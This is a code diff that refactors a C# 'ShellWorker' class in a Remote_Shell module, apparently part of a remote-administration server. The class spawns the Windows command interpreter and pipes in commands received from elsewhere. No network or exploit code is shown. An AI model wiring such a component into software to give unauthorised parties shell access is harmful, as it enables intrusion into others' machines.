@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 
-namespace bc.srv.Muduli.Remote_Shell
+namespace bc.srv.Modules.Remote_Shell
 {
     internal class ShellWorker
     {
@@ -17,7 +17,7 @@ namespace bc.srv.Muduli.Remote_Shell
         {
             try
             {
-                if (StdOut == null && StdError == null)
+                if (this.StdOut == null && this.StdError == null)
                     return false;
 
                 string comspec;
@@ -33,7 +33,7 @@ namespace bc.srv.Muduli.Remote_Shell
                 if (string.IsNullOrEmpty(comspec))
                     return false;
 
-                process = new Process
+                this.process = new Process
                 {
                     StartInfo =
                     {
@@ -47,15 +47,15 @@ namespace bc.srv.Muduli.Remote_Shell
                     EnableRaisingEvents = true
                 };
 
-                process.ErrorDataReceived += StdError;
-                process.OutputDataReceived += StdOut;
-                process.Start();
+                this.process.ErrorDataReceived += this.StdError;
+                this.process.OutputDataReceived += this.StdOut;
+                this.process.Start();
 
-                if (StdError != null)
-                    process.BeginErrorReadLine();
+                if (this.StdError != null)
+                    this.process.BeginErrorReadLine();
 
-                if (StdOut != null)
-                    process.BeginOutputReadLine();
+                if (this.StdOut != null)
+                    this.process.BeginOutputReadLine();
 
                 return true;
             }
@@ -74,19 +74,19 @@ namespace bc.srv.Muduli.Remote_Shell
         {
             try
             {
-                if (process == null || StdOut == null && StdError == null || process.HasExited)
+                if (this.process == null || this.StdOut == null && this.StdError == null || this.process.HasExited)
                 {
-                    if (process != null)
-                        Terminate();
+                    if (this.process != null)
+                        this.Terminate();
 
-                    Initialize();
+                    this.Initialize();
                 }
 
-                if (process != null)
+                if (this.process != null)
                 {
-                    process.StandardInput.WriteLine(command);
-                    process.StandardInput.WriteLine(""); // chiedo localizzazione
-                    process.StandardInput.WriteLine("@echo " + SCmdComplete); // fine comandi
+                    this.process.StandardInput.WriteLine(command);
+                    this.process.StandardInput.WriteLine(""); // chiedo localizzazione
+                    this.process.StandardInput.WriteLine("@echo " + this.SCmdComplete); // fine comandi
                 }
             }
             catch
@@ -101,7 +101,7 @@ namespace bc.srv.Muduli.Remote_Shell
         {
             try
             {
-                if (process == null || process.HasExited)
+                if (this.process == null || this.process.HasExited)
                     return;
 
                 var processes = Process.GetProcesses();
@@ -116,9 +116,9 @@ namespace bc.srv.Muduli.Remote_Shell
                     {
                     }
 
-                process.Kill();
-                process.Close();
-                process = null;
+                this.process.Kill();
+                this.process.Close();
+                this.process = null;
             }
             catch
             {
